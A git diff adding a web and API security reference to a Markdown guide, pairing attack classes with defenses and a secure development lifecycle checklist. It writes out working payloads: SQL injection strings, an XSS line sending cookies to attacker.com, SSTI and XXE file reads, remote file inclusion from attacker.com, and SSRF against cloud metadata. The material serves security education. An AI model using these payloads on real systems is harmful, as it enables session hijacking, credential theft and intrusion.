@@ -217,6 +217,113 @@ APIs now represent the dominant attack surface in modern application architectur
 
 ---
 
+---
+
+## Web Application Attack Reference
+
+**SQL Injection**
+- Types: Classic (UNION-based), Blind (Boolean/Time-based), Out-of-Band (DNS/HTTP), Error-based
+- Classic UNION: `' UNION SELECT username,password,NULL FROM users--`
+- Boolean blind: `' AND 1=1--` (true) vs `' AND 1=2--` (false)
+- Time-based blind: `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' OR SLEEP(5)--` (MySQL)
+- SQLmap automation: `sqlmap -u "https://target.com/item?id=1" --dbs --batch --level=5 --risk=3`
+- Defense: Parameterized queries / prepared statements (ONLY reliable fix); input validation as defense-in-depth; WAF as additional layer
+
+**Cross-Site Scripting (XSS)**
+- Reflected: Input echoed in response immediately; requires victim to click crafted link
+- Stored: Payload persisted in database; executed by all visitors
+- DOM: JavaScript modifies DOM using attacker-controlled data; never touches server
+- Payload examples: `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
+- CSP bypass techniques: JSONP endpoints, trusted domains with writable content, `unsafe-inline` overrides
+- Defense: Output encoding (context-aware), CSP headers, HTTPOnly/Secure cookie flags
+
+**Server-Side Template Injection (SSTI)**
+- Detection: `{{7*7}}` → `49`; `${7*7}` → Java EL injection
+- Common frameworks:
+  - Jinja2 (Python): `{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
+  - Twig (PHP): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
+- Defense: Never pass user input to template engine; use sandboxed rendering
+
+**XML External Entity (XXE)**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+```
+- Blind XXE: Out-of-band exfiltration via HTTP/DNS requests
+- Defense: Disable external entity processing in XML parser; prefer JSON APIs
+
+**Path Traversal / LFI / RFI**
+- Path traversal: `../../../etc/passwd`; URL-encoded: `%2e%2e%2f`
+- LFI with log poisoning: Include PHP code via User-Agent header; include Apache access log
+- RFI: `include("http://attacker.com/shell.txt")` — requires `allow_url_include = On`
+- Defense: Whitelist allowed file names; never use user input in file operations
+
+**SSRF (Server-Side Request Forgery)**
+- Basic: `?url=http://169.254.169.254/latest/meta-data/` (AWS IMDS credential theft)
+- Bypass filters: `http://127.0.0.1:6379` → Redis, `http://[::1]:22` → SSH, `http://0177.0.0.1` (octal bypass)
+- Blind SSRF: Use Interactsh/Burp Collaborator for out-of-band detection
+- Defense: Allowlist outbound requests; IMDS v2 enforcement; network egress controls
+
+---
+
+## API Security
+
+**API Attack Techniques**
+- BOLA (Broken Object Level Authorization): `GET /api/users/1234/orders` → change to `/api/users/1235/orders`; horizontal IDOR
+- BFLA (Broken Function Level Authorization): Regular user accessing admin endpoints (DELETE /api/admin/users)
+- Mass assignment: POST body includes `"role":"admin"` or `"credit":9999` — server blindly persists all fields
+- API key leakage: Keys in JavaScript bundles, git history, Wayback Machine
+- GraphQL introspection: `{"query":"{__schema{types{name}}}"}` exposes entire API schema
+- JWT attacks: alg:none, RS256→HS256 confusion, weak HS256 secret
+
+**API Security Testing Methodology**
+```bash
+# Enumerate API endpoints
+gobuster dir -u https://api.target.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
+
+# Fuzz parameters
+ffuf -u https://api.target.com/users/FUZZ -w ids.txt -mc 200
+
+# Test BOLA - two account approach
+# Account A: capture valid request with ID 1001
+# Account B: replace session token, keep ID 1001 - if response returns A's data = BOLA
+
+# GraphQL introspection
+curl -X POST https://api.target.com/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name fields{name}}}}"}'
+```
+
+---
+
+## Secure Development Lifecycle (SDL)
+
+**Threat Modeling Integration**
+- When: During design phase, before any code is written
+- Who: Developer + Security champion + Architect
+- Tool: OWASP Threat Dragon, Microsoft TMT, Miro/Lucidchart for data flow diagrams
+- Output: List of threats and mitigations; feeds into security requirements and test cases
+
+**Security Requirements by Phase**
+- Design: Threat model completed, trust boundaries defined, authentication/authorization model documented
+- Development: SAST integrated in IDE; no hardcoded secrets (detected by pre-commit hooks)
+- Build: SAST + SCA in CI/CD pipeline; container scanning; SBOM generated
+- Test: DAST scan against staging; manual pentest for high-risk features
+- Deploy: IaC scanning; secrets manager integration; WAF rules updated
+- Operate: SIEM alerts tuned; DAST scheduled weekly; pentest annually
+
+**Security Code Review Focus Areas**
+- Authentication: Password hashing (bcrypt/Argon2/scrypt — NOT MD5/SHA1 unsalted), session token entropy, remember-me security
+- Authorization: Access control on every function, not just the UI
+- Cryptography: Approved algorithms, key length, IV randomness, no ECB mode
+- Input validation: Server-side validation, parameterized queries, output encoding
+- Error handling: No stack traces in production responses, log errors securely
+- Secrets management: No hardcoded credentials, API keys, or private keys
+
+---
+
+## WAF Rules for Application Security (See ENTERPRISE_SECURITY_CONTROLS.md)
+
 ## Key Resources
 
 - [PortSwigger Web Security Academy](https://portswigger.net/web-security) — The definitive free web security training platform; interactive labs and structured paths for every major vulnerability class
